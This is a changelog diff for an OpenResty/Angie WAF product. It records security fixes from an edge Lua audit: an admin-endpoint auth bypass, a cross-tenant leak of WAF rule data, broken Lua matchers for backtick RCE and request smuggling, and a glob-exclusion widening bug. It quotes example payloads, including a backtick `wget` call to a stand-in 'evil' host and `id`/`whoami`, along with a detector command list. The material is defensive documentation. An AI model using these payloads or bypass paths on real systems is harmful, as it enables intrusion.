@@ -17,6 +17,62 @@ back-filled here — see the git/PR history for that period.
 
 ## [Unreleased]
 
+### Security
+- **Scoped-vs-admin boundary — edge `lua-stats` (F01):** the `/cfm-admin/lua-stats`
+  dashboard endpoint (rendered inside OpenResty/Angie) gated access with an
+  `auth_request` pointed at `/api/v1/tokens/me` — a **scoped-OR-admin** endpoint
+  that returns 200 for *any* valid token. A scoped cPanel **viewer** token
+  therefore passed the gate and received the **fleet-wide** stats blob: every
+  tenant's WAF exclude host/path lists and per-rule modes (logonly vs block),
+  plus cert and decision-cache counters — enough to craft WAF bypasses against
+  the whole box. Added an admin-only auth probe `/api/v1/admin/authcheck`
+  (`RequireAdmin`; 403 for scoped/anonymous) and repointed the `auth_request`
+  gate to it in **both** `openresty.conf` and `angie.conf` (two server blocks
+  each). The admin WebUI dashboard — the only legitimate consumer — is
+  unaffected. Found by the 2026-07 edge Lua audit.
+- **WAF hit-rates cross-tenant leak (F02):** `GET /api/v1/waf/hit-rates` was
+  gated scoped-OR-admin but read the `?host=` query verbatim with no scope check,
+  so a scoped cPanel user could read **any** vhost's per-rule WAF hit rates — and
+  an empty host aggregated **every** tenant — revealing which rules are logonly
+  vs block and where they fire. `handleWAFHitRates` now enforces the token scope,
+  keyed on **role** (not on the presence of a scope map — so a vhost-less scoped
+  token can never be misread as admin): a non-admin caller must target a single
+  host inside a **non-empty** allowlist; an empty host, an empty scope, or an
+  out-of-scope host is `403`. The host is normalized (lowercased) once so the
+  scope check and the case-sensitive history read agree. Admin/loopback (the CLI)
+  is unchanged. Mirrors the role-keyed `scopedMySQLFilterHandler` / `vhostAllowed`
+  guards; added to `docs/endpoint_scope_inventory.md`. Found by the 2026-07 edge
+  Lua audit.
+- **WAF (rule 317, `WAF_CMD_PAYLOAD:PAY_BACKTICK`, challenge): fixed a dead
+  backtick-RCE matcher that let most backtick command substitutions through.**
+  The command allowlist was written `inner:match("^%s*(wget|curl|…)%f[^%a]")`,
+  but **Lua patterns have no `(a|b|c)` alternation** — that group matched the
+  literal string `wget|curl|…`, so it never fired. Only the adjacent
+  `;`/`|`/`&&`-inside-backticks branch worked, so `` `wget http://evil/x` ``,
+  `` `id` ``, `` `whoami` `` (no shell metachar) passed unchallenged. The leading
+  token inside the backticks is now captured (`^%s*(%a+)`) and tested against a
+  command set, so a full word must match exactly (`` `category` `` ≠ `cat`). It
+  scans query args only, the search-field carve-out (q/s/term/search/query) is
+  preserved, and the tier stays **challenge** (no block/ban). Covered by
+  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
+  Lua audit (F05).
+- **WAF / challenge excludes: the in-path (Lua) glob matcher now scopes `*`/`?`
+  to a single path segment, matching the Go enforcement matcher.** The Lua
+  `glob_to_lua_pattern` (`cfm_waf_excl.lua`) expanded `*`→`.*` and `?`→`.`, both
+  of which cross a `/`, while the Go log-driven matcher (`globToRegex` in
+  `exclude_store.go`) uses `[^/]*`/`[^/]`. So an operator exclude like
+  `/wp-admin/*` switched the WAF (or challenge) **off in-path** for the entire
+  `/wp-admin/a/b/c…` subtree, while the log-driven side only excluded direct
+  children — a silent, one-sided widening of the WAF-off region onto unintended
+  deep paths. Lua now emits `[^/]*`/`[^/]` too, so both engines agree. Hosts are
+  unaffected (no `/`). To exclude a whole subtree, use a **non-glob path prefix**
+  (`/wp-admin`), which already matches the subtree at a segment boundary.
+  Behaviour change: an exclude relying on `*` to cross `/` in-path now stops at
+  one segment (as it always did on the log-driven side). `[...]` bracket-class
+  globs are still matched literally in Lua (Go treats them as a class) — a
+  rarer, narrower-in-Lua consistency gap tracked as a follow-up. Covered by
+  `scripts/tests/cfm_waf_excl_test.lua`. Found by the 2026-07 edge Lua audit (F10).
+
 ### Added
 - **Web detector observability:** per-IP / subnet challenge **issuance** is now
   logged to `cfm.challenges.log` as `[challenge_issued] ip=… host=… rule=… ttl=…`
@@ -30,6 +86,30 @@ back-filled here — see the git/PR history for that period.
   it's greppable without being noisy.
 
 ### Fixed
+- **Edge → bridge RPC (`cfm.lua`):** removed a ~300 ms stall on every edge→daemon
+  call that returns an empty body (`Content-Length: 0`) — the WAF autoblock
+  **push** and the block/clear calls (`/nginx/ip`, `/nginx/vhost`). (`observe`
+  and `ok-touch` return a small JSON body, so they were never affected.)
+  `http_unix` read the response body with a fall-through `receive("*a")`, which
+  on the keep-alive
+  bridge socket blocks until the read timeout (`CFM_DECISION_TIMEOUT_MS`, default
+  300 ms) because the daemon never closes the connection; an explicit
+  `Content-Length: 0` is now short-circuited to an empty body. Under a
+  WAF-tripping flood each distinct `(ip, reason)` push tied up an nginx worker
+  light-thread for ~300 ms of blocked time — the source of the intermittent "lua
+  tcp socket read timed out" seen under only modest load. No behaviour change for
+  non-empty responses (decision JSON, chunked). Found by the 2026-07 edge Lua
+  audit (F04).
+- **WAF (rule 606, `WAF_HTTP_SMUGGLING`, logonly): the request-line-smuggling
+  detector never fired.** It was doubly dead: the verb match used
+  `sl:match("(get|post|…)…")` (Lua has no `|` alternation, so it matched the
+  literal string), AND the pre-filter tested the raw string for lowercase
+  `" http/"` while a smuggled request line is normally uppercase
+  `"GET … HTTP/1.1"`. The string is now lowercased first, then each known method
+  is tested at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Stays
+  **logonly** (observe-only). Covered by
+  `scripts/tests/cfm_waf_backtick_smuggling_test.lua`. Found by the 2026-07 edge
+  Lua audit (F12).
 - **Web detector:** machine-to-machine API endpoints are no longer caught by a
   *vhost-wide* challenge. When a vhost trips the auto-suspicious-vhost score
   (`CHALLENGE_SUSPICIOUS_VHOST_SCORE` / `CHALLENGE_VHOST`), **every** request to
